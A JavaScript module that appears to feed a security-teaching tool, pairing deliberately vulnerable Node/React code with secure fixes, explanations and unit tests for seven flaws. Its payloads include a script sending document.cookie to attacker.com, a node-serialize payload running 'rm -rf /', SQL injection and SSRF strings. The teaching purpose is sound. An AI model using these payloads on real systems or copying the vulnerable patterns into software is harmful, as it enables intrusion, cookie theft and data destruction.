/**
 * Vulnerability Preset Database & Theoretical Knowledge Base
 */

export const vulnerabilityPresets = {
  sqli: {
    id: 'sqli',
    name: 'SQL Injection (SQLi) Login Form',
    severity: 'critical',
    endpoint: 'auth/login',
    payload: "admin' OR '1'='1",
    vulnerableCode: `// Vulnerable Node.js authentication endpoint
app.post('/api/v1/auth/login', async (req, res) => {
  const { username, password } = req.body;
  
  // CRITICAL: Raw string concatenation of user input directly into SQL statement
  const query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
  
  try {
    const dbResult = await db.query(query);
    if (dbResult.rows.length > 0) {
      res.json({ success: true, user: dbResult.rows[0].username });
    } else {
      res.status(401).json({ success: false, error: 'Invalid credentials' });
    }
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});`,
    secureCode: `// Secure Node.js authentication endpoint
app.post('/api/v1/auth/login', async (req, res) => {
  const { username, password } = req.body;
  
  // SECURE: Parameterized query (Prepared Statement)
  const query = 'SELECT * FROM users WHERE username = $1 AND password = $2';
  
  try {
    // Database driver separates code structure from input parameters
    const dbResult = await db.query(query, [username, password]);
    
    if (dbResult.rows.length > 0) {
      res.json({ success: true, user: dbResult.rows[0].username });
    } else {
      res.status(401).json({ success: false, error: 'Invalid credentials' });
    }
  } catch (err) {
    res.status(500).json({ success: false, error: 'Internal Server Error' });
  }
});`,
    theory: `### What is SQL Injection (SQLi)?
SQL Injection is a vulnerability that occurs when an application takes user input and directly concatenates it into a database query. This allows an attacker to inject arbitrary SQL commands, letting them manipulate the query logic.

### How the Exploit Works:
An attacker enters \`admin' OR '1'='1\` as the username. The concatenated query becomes:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...'
\`\`\`
Since \`'1'='1'\` is always **true**, the query matches all rows in the database and logs the attacker in as the first user (often \`admin\`) without needing a password.

### Mitigation Strategies:
1. **Parameterized Queries (Prepared Statements):** Keep query logic and parameter variables completely separate. The database driver treats parameters as literal values, not executable code.
2. **Object-Relational Mapping (ORM):** Libraries like Prisma, Sequelize, or Hibernate use parameterized queries under the hood.
3. **Input Sanitization/Validation:** Limit allowed characters in input fields (e.g., username must be alphanumeric).`,
    unitTests: `// Unit Test Suite: SQL Injection authentication checks
describe('POST /api/v1/auth/login', () => {
  it('should authenticate user with valid credentials', async () => {
    const res = await request(app)
      .post('/api/v1/auth/login')
      .send({ username: 'john_doe', password: 'securePassword123' });
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });

  it('should reject SQL Injection input in username field', async () => {
    const res = await request(app)
      .post('/api/v1/auth/login')
      .send({ username: "admin' OR '1'='1", password: 'any' });
    
    // Vulnerable code returns 200 OK because the query returns a user record.
    // Secure code returns 401 Unauthorized because the username is treated as literal.
    expect(res.status).toBe(401);
    expect(res.body.success).toBe(false);
  });
});`
  },

  xss: {
    id: 'xss',
    name: 'Unprotected DOM-XSS Comment Box',
    severity: 'high',
    endpoint: 'posts/comment',
    payload: "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
    vulnerableCode: `// Vulnerable client-side React component rendering user comments
function CommentWidget({ userComments }) {
  return (
    <div className="comment-list">
      {userComments.map((comment, index) => (
        <div key={index} className="comment-box">
          <h5>Comment by: {comment.author}</h5>
          
          {/* CRITICAL: Rendering unsanitized HTML input using innerHTML */}
          <p dangerouslySetInnerHTML={{ __html: comment.text }} />
        </div>
      ))}
    </div>
  );
}`,
    secureCode: `// Secure React component rendering user comments safely
import DOMPurify from 'dompurify'; // Sanitizer library

function CommentWidget({ userComments }) {
  return (
    <div className="comment-list">
      {userComments.map((comment, index) => {
        // SECURE option A: Render as plain text (escapes HTML by default)
        // return <p>{comment.text}</p>;
        
        // SECURE option B: Sanitize HTML if markup styling is explicitly allowed
        const cleanHtml = DOMPurify.sanitize(comment.text);
        
        return (
          <div key={index} className="comment-box">
            <h5>Comment by: {comment.author}</h5>
            <p dangerouslySetInnerHTML={{ __html: cleanHtml }} />
          </div>
        );
      })}
    </div>
  );
}`,
    theory: `### What is Cross-Site Scripting (XSS)?
Cross-Site Scripting occurs when an application includes untrusted user data in web page renders without validation or escaping. This allows attackers to execute malicious JavaScript files/scripts in a victim's browser session.

### Types of XSS:
1. **Stored (Persistent) XSS:** Malicious scripts are stored on databases (like a forum post or comment) and executed when users load that page.
2. **Reflected (Non-persistent) XSS:** The script is part of a URL parameter, executed when a user clicks the link.
3. **DOM-based XSS:** Script execution occurs purely in client-side client scripts handling URLs or document properties.

### Mitigation Strategies:
1. **Context-Aware Escaping:** Use browser defaults like React's standard curly braces \`{text}\`, which treat strings as plaintext.
2. **HTML Sanitization:** When HTML rendering is required, run inputs through a battle-tested sanitizer library like **DOMPurify** to strip tags like \`<script>\`, \`onload\`, and \`onerror\`.
3. **Content Security Policy (CSP):** Set HTTP headers restricting script origins and blocking inline scripts.`,
    unitTests: `// Unit Test Suite: Cross-Site Scripting DOM validation
describe('CommentWidget Component', () => {
  it('should render standard plain text comments safely', () => {
    const comments = [{ author: 'Alice', text: 'Hello world!' }];
    const { container } = render(<CommentWidget userComments={comments} />);
    expect(container.querySelector('.comment-box p').textContent).toBe('Hello world!');
  });

  it('should sanitize script tags in comments to prevent script execution', () => {
    const comments = [{ author: 'Eve', text: '<script>alert("hacked")</script>' }];
    const { container } = render(<CommentWidget userComments={comments} />);
    
    // Vulnerable code renders dangerHTML raw, meaning <script> tag exists in DOM.
    // Secure code purifies HTML, removing dangerous tags.
    const hasScript = container.querySelector('script');
    expect(hasScript).toBeNull();
  });
});`
  },

  race: {
    id: 'race',
    name: 'Race Condition (Double-Spend Withdrawal)',
    severity: 'critical',
    endpoint: 'account/withdraw',
    payload: "concurrent-withdraw-request",
    vulnerableCode: `// Vulnerable bank withdrawal endpoint (Express + Knex ORM)
app.post('/api/v1/account/withdraw', async (req, res) => {
  const { userId, amount } = req.body;
  
  // 1. Fetch balance (First query)
  const balance = await getBalance(userId); // returns $150
  
  if (balance >= amount) {
    // Simulating parallel network lag
    await delay(300);
    
    // 2. Perform debit (Second query)
    const newBalance = balance - amount;
    await updateBalance(userId, newBalance);
    
    res.json({ success: true, remaining: newBalance });
  } else {
    res.status(400).json({ success: false, error: 'Insufficient funds' });
  }
});`,
    secureCode: `// Secure bank withdrawal using Database Transactions & Pessimistic Locking
app.post('/api/v1/account/withdraw', async (req, res) => {
  const { userId, amount } = req.body;
  
  try {
    // Start database transaction
    await db.transaction(async (trx) => {
      // SECURE: SELECT ... FOR UPDATE locks rows from concurrent updates
      const user = await trx('accounts')
        .where('user_id', userId)
        .select('balance')
        .forUpdate()
        .first();
        
      if (user.balance >= amount) {
        const newBalance = user.balance - amount;
        
        await trx('accounts')
          .where('user_id', userId)
          .update({ balance: newBalance });
          
        res.json({ success: true, remaining: newBalance });
      } else {
        res.status(400).json({ success: false, error: 'Insufficient funds' });
      }
    });
  } catch (err) {
    res.status(500).json({ success: false, error: 'Transaction failed' });
  }
});`,
    theory: `### What is a Race Condition?
A Race Condition occurs when a program's output is dependent on the sequence or timing of uncontrollable events (such as network latency or database read/write speeds). In web APIs, concurrency issues arise when multiple API processes read and modify data concurrently.

### How the Exploit Works:
An account has **$150**. The attacker dispatches **two parallel HTTP requests** to withdraw **$100** at the exact same millisecond:
* Request A reads balance: $150. Approved ($150 >= $100).
* Request B reads balance: $150. Approved ($150 >= $100).
* Request A updates balance: $150 - $100 = $50.
* Request B updates balance: $150 - $100 = $50 (or overwrites as -$50 if using decrement).
The attacker walked away with **$200** while the balance shows **$50** (or a negative state).

### Mitigation Strategies:
1. **Pessimistic Locking (SELECT ... FOR UPDATE):** Locks database records during read operations. Other queries trying to read or write the same rows must wait until the transaction commits or aborts.
2. **Optimistic Locking:** Uses version tags. Updates fail if the version hash changes between read and write cycles.
3. **Database Constraints:** Set constraints like \`CHECK (balance >= 0)\` on the column schema.`,
    unitTests: `// Unit Test Suite: Concurrent Withdrawal Concurrency checks
describe('POST /api/v1/account/withdraw', () => {
  it('should allow a single withdrawal if balance is sufficient', async () => {
    const res = await request(app)
      .post('/api/v1/account/withdraw')
      .send({ userId: 1, amount: 50 });
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });

  it('should prevent double-spending under concurrent requests', async () => {
    // Send two concurrent requests to withdraw $100 when balance is $150
    const req1 = request(app).post('/api/v1/account/withdraw').send({ userId: 1, amount: 100 });
    const req2 = request(app).post('/api/v1/account/withdraw').send({ userId: 1, amount: 100 });
    
    const [res1, res2] = await Promise.all([req1, req2]);
    
    // Vulnerable code: both requests might succeed (success: true)
    // Secure code: database locking serializes them, causing one to fail (400 Bad Request)
    const successfulRequests = [res1, res2].filter(r => r.body.success === true);
    expect(successfulRequests.length).toBe(1);
  });
});`
  },

  resilience: {
    id: 'resilience',
    name: 'DB Connection Resilience & Failures',
    severity: 'medium',
    endpoint: 'items/list',
    payload: "simulate-db-offline",
    vulnerableCode: `// Vulnerable implementation lacking error handling and resilience
app.get('/api/v1/items/list', async (req, res) => {
  // CRITICAL: Directly awaiting query without catch block or fallback cache
  const dbResult = await db.query("SELECT * FROM items LIMIT 10");
  
  // If DB connection fails, execution crashes here with Unhandled Rejection
  res.json({ success: true, items: dbResult.rows });
});`,
    secureCode: `// Secure implementation with Try-Catch, Retries, and Circuit Breaker Cache
import redisClient from './redis';

app.get('/api/v1/items/list', async (req, res) => {
  const maxRetries = 3;
  let attempt = 0;
  
  while (attempt < maxRetries) {
    try {
      attempt++;
      // Attempt DB query
      const dbResult = await db.query("SELECT * FROM items LIMIT 10");
      
      // Update cache background task
      redisClient.setex('items_cache', 3600, JSON.stringify(dbResult.rows));
      
      return res.json({ success: true, source: 'database', items: dbResult.rows });
    } catch (err) {
      console.error(\`Database query failed on attempt \${attempt}: \${err.message}\`);
      
      if (attempt >= maxRetries) {
        // SECURE fallback: Try loading from Redis cache if PostgreSQL is offline
        try {
          const cachedData = await redisClient.get('items_cache');
          if (cachedData) {
            return res.json({ 
              success: true, 
              source: 'redis_cache', 
              warning: 'PostgreSQL offline, serving cache', 
              items: JSON.parse(cachedData) 
            });
          }
        } catch (cacheErr) {
          console.error('Cache retrieve failed:', cacheErr.message);
        }
        
        // Return structured 503 instead of crashing process
        return res.status(503).json({ 
          success: false, 
          error: 'Service Temporarily Unavailable',
          details: 'DB_CONN_TIMEOUT'
        });
      }
      
      // Exponential backoff before retry
      await new Promise(r => setTimeout(r, attempt * 100));
    }
  }
});`,
    theory: `### What is Infrastructure Resilience?
Production applications depend on third-party APIs, databases, caches, and cloud servers. If any dependency goes offline or suffers high latency, the application must handle the failure gracefully instead of throwing unhandled exceptions or hanging indefinitely.

### Resilience Patterns:
1. **Try-Catch Block Wrapping:** Catch errors at the boundaries of network/DB requests to prevent thread crashes.
2. **Retry with Exponential Backoff:** Automatically retry queries a few times, increasing wait intervals between attempts.
3. **Fallback Caching:** Serve static, stale, or cached data if primary storage is unreachable.
4. **Circuit Breaker:** Completely cut off calls to a failing dependency for a cooldown period to let it recover, avoiding system flooding.

### Mitigation in Node.js:
Wrap all database and network calls in \`try/catch\` blocks. Handle promise rejections explicitly using process handlers like:
\`\`\`js
process.on('unhandledRejection', (reason, promise) => { ... });
\`\`\``,
    unitTests: `// Unit Test Suite: DB Connection Resilience & Cache Fallback
describe('GET /api/v1/items/list', () => {
  it('should fetch item lists when PostgreSQL is online', async () => {
    mockDBState('online');
    const res = await request(app).get('/api/v1/items/list');
    expect(res.status).toBe(200);
    expect(res.body.source).toBe('database');
  });

  it('should fall back to Redis cache if PostgreSQL connection fails', async () => {
    mockDBState('offline');
    mockRedisCache('items_cache', [{ id: 1, name: 'Cached Item' }]);
    
    const res = await request(app).get('/api/v1/items/list');
    
    // Vulnerable code: throws 500 or crashes because it lacks try-catch fallback.
    // Secure code: catches PostgreSQL error and falls back to Redis.
    expect(res.status).toBe(200);
    expect(res.body.source).toBe('redis_cache');
    expect(res.body.items.length).toBeGreaterThan(0);
  });
});`
  },

  idor: {
    id: 'idor',
    name: 'Broken Object Level Authorization (IDOR/BOLA)',
    severity: 'critical',
    endpoint: 'orders/lookup',
    payload: "orderId_9981",
    vulnerableCode: `// Vulnerable bank/order lookup
app.get('/api/v1/orders/:id', async (req, res) => {
  const orderId = req.params.id;
  
  // CRITICAL: Checks order ID directly without verifying user ownership
  const query = 'SELECT * FROM orders WHERE id = $1';
  const result = await db.query(query, [orderId]);
  
  if (result.rows.length > 0) {
    res.json(result.rows[0]);
  } else {
    res.status(404).json({ error: 'Order not found' });
  }
});`,
    secureCode: `// Secure bank/order lookup with authorization check
app.get('/api/v1/orders/:id', async (req, res) => {
  const orderId = req.params.id;
  const userId = req.user.id; // Logged in user context from auth middleware
  
  // SECURE: Fetch order and verify it belongs to the authenticated user
  const query = 'SELECT * FROM orders WHERE id = $1 AND user_id = $2';
  const result = await db.query(query, [orderId, userId]);
  
  if (result.rows.length > 0) {
    res.json(result.rows[0]);
  } else {
    res.status(404).json({ error: 'Order not found or unauthorized' });
  }
});`,
    theory: `### What is Broken Object Level Authorization (BOLA/IDOR)?
Broken Object Level Authorization (also known as Insecure Direct Object Reference) is a security vulnerability where an application provides direct access to objects based on user-supplied input without verifying if the user has permissions to access those specific objects.

### How the Exploit Works:
An attacker logs in as User A, and is assigned order ID \`1001\`.
By simply modifying the API URL in their browser or tool to:
\`\`\`text
GET /api/v1/orders/1002
\`\`\`
The backend directly executes the query \`SELECT * FROM orders WHERE id = 1002\`. Because there is no check on who owns order 1002, User A can inspect private orders of User B, causing major data leakage.

### Mitigation Strategies:
1. **Enforce Authorization Checks:** Verify that the currently logged-in user context matches the owner of the requested object ID.
2. **Use Non-Sequential Identifiers:** Use UUIDs (e.g., \`d3b07384-d113-441d...\`) instead of sequential integer IDs (\`1001\`, \`1002\`) to make random resource ID guessing extremely difficult.
3. **Indirect Reference Mapping:** Use a temporary map to bind resource IDs to session-specific keys.`,
    unitTests: `// Unit Test Suite: Broken Object Level Authorization (IDOR) checks
describe('GET /api/v1/orders/:id', () => {
  it('should fetch order details for the owner of the order', async () => {
    const res = await request(app)
      .get('/api/v1/orders/1001')
      .set('Authorization', 'Bearer token_user_A'); // User A owns 1001
    expect(res.status).toBe(200);
    expect(res.body.id).toBe('1001');
  });

  it('should block requests to fetch orders owned by other users', async () => {
    const res = await request(app)
      .get('/api/v1/orders/1002') // User B owns 1002
      .set('Authorization', 'Bearer token_user_A');
    
    // Vulnerable code: returns 200 and leaks User B's order to User A.
    // Secure code: returns 404/403 since User A is unauthorized.
    expect(res.status).toBe(404);
  });
});`
  },

  ssrf: {
    id: 'ssrf',
    name: 'Server-Side Request Forgery (SSRF)',
    severity: 'high',
    endpoint: 'posts/proxy',
    payload: "http://localhost:8080/admin",
    vulnerableCode: `// Vulnerable proxy/image downloader
app.post('/api/v1/posts/proxy', async (req, res) => {
  const { imageUrl } = req.body;
  
  // CRITICAL: Fetching user-supplied URL directly without validation or whitelist filter
  const response = await axios.get(imageUrl);
  res.send(response.data);
});`,
    secureCode: `// Secure proxy/image downloader with domain whitelist
app.post('/api/v1/posts/proxy', async (req, res) => {
  const { imageUrl } = req.body;
  
  try {
    const parsedUrl = new URL(imageUrl);
    const allowedDomains = ['images.unsplash.com', 'res.cloudinary.com'];
    
    // SECURE: Enforce strict domain whitelist
    if (!allowedDomains.includes(parsedUrl.hostname)) {
      return res.status(400).json({ error: 'Domain not allowed' });
    }
    
    const response = await axios.get(imageUrl, { timeout: 3000 });
    res.send(response.data);
  } catch (err) {
    res.status(400).json({ error: 'Invalid URL or failed to fetch' });
  }
});`,
    theory: `### What is Server-Side Request Forgery (SSRF)?
Server-Side Request Forgery (SSRF) occurs when an application fetches a remote resource without validating the user-supplied URL. An attacker can manipulate this parameter to force the backend application to make HTTP requests to arbitrary domains, including internal servers.

### How the Exploit Works:
If the backend accepts any URL, an attacker can submit:
\`\`\`text
http://localhost:8080/admin
\`\`\`
or the AWS metadata link:
\`\`\`text
http://169.254.169.254/latest/meta-data/
\`\`\`
The backend server (which has access to the local internal network) will fetch these private endpoints and send the responses back to the attacker, bypassing external firewalls.

### Mitigation Strategies:
1. **Strict Whitelisting:** Define and enforce a strict list of allowed domain names for outgoing requests.
2. **URL Parsing & Validation:** Validate the protocol (only allow \`http\` / \`https\`) and verify that the hostname does not map to loopback/private IP ranges (e.g. \`127.0.0.1\`, \`10.0.0.0/8\`, \`192.168.0.0/16\`).
3. **Dedicated Network Outbound Rules:** Run proxy fetches on an isolated subnet with strict network firewall egress rules.`,
    unitTests: `// Unit Test Suite: Server-Side Request Forgery proxy filters
describe('POST /api/v1/posts/proxy', () => {
  it('should proxy requests to allowed domains', async () => {
    const res = await request(app)
      .post('/api/v1/posts/proxy')
      .send({ imageUrl: 'https://images.unsplash.com/photo-123' });
    expect(res.status).toBe(200);
  });

  it('should block requests to internal loopback / localhost addresses', async () => {
    const res = await request(app)
      .post('/api/v1/posts/proxy')
      .send({ imageUrl: 'http://localhost:8080/admin' });
    
    // Vulnerable code: fetches localhost and leaks internal dashboard data.
    // Secure code: rejects domain due to whitelist mismatch.
    expect(res.status).toBe(400);
  });
});`
  },

  deserialization: {
    id: 'deserialization',
    name: 'Insecure Deserialization (Object Injection)',
    severity: 'critical',
    endpoint: 'auth/session',
    payload: '{"username":"admin"}',
    vulnerableCode: `// Vulnerable cookie session parser
app.get('/api/v1/auth/session', (req, res) => {
  const sessionCookie = req.cookies.session;
  
  // CRITICAL: Unsafe deserialization of user cookies using serialization library
  const sessionData = serialize.unserialize(sessionCookie);
  res.json({ welcome: sessionData.username });
});`,
    secureCode: `// Secure cookie session parser using standard JSON.parse
app.get('/api/v1/auth/session', (req, res) => {
  const sessionCookie = req.cookies.session;
  
  try {
    // SECURE: Use safe JSON parsing instead of raw object deserialization
    const sessionData = JSON.parse(sessionCookie);
    res.json({ welcome: sessionData.username });
  } catch (err) {
    res.status(400).json({ error: 'Invalid session cookie' });
  }
});`,
    theory: `### What is Insecure Deserialization?
Insecure Deserialization occurs when untrusted input is parsed back into objects, allowing an attacker to inject serialized payloads containing function callbacks or properties that can lead to Remote Code Execution (RCE), Denial of Service, or object injection.

### How the Exploit Works:
Libraries like \`node-serialize\` allow deserializing functions. If the application deserializes an untrusted cookie, an attacker can pass a serialized string containing an Immediately Invoked Function Expression (IIFE):
\`\`\`javascript
'{"rce":"_$$ND_FUNC$$_function(){ require(\\'child_process\\').exec(\\'rm -rf /\\') }() "}'
\`\`\`
When the backend calls \`serialize.unserialize()\`, this function executes instantly, compromising the host server.

### Mitigation Strategies:
1. **Never Deserialize Untrusted Data:** Do not deserialize cookies or user payloads into active executable objects.
2. **Use Structured Data Formats:** Use simple text-based structures like JSON (\`JSON.parse\`) which do not support function serialization or class instantiation.
3. **Cryptographic Signatures:** Sign and encrypt cookies using strong keys to prevent attackers from tampering with session data.`,
    unitTests: `// Unit Test Suite: Insecure Deserialization cookie checks
describe('GET /api/v1/auth/session', () => {
  it('should authenticate user with normal session cookies', async () => {
    const res = await request(app)
      .get('/api/v1/auth/session')
      .set('Cookie', ['session={"username":"john"}']);
    expect(res.status).toBe(200);
    expect(res.body.welcome).toBe('john');
  });

  it('should ignore serialized function callbacks in session cookies', async () => {
    const payload = '{"rce":"_$$ND_FUNC$$_function(){ return 123; }()"}';
    const res = await request(app)
      .get('/api/v1/auth/session')
      .set('Cookie', [\`session=\${payload}\`]);
    
    // Vulnerable code: executes RCE function resulting in crash or arbitrary command run.
    // Secure code: parses cookie strictly as JSON text, ignoring function execution.
    expect(res.status).toBe(200);
    expect(res.body.welcome).toBeUndefined(); // function not executed
  });
});`
  }
};
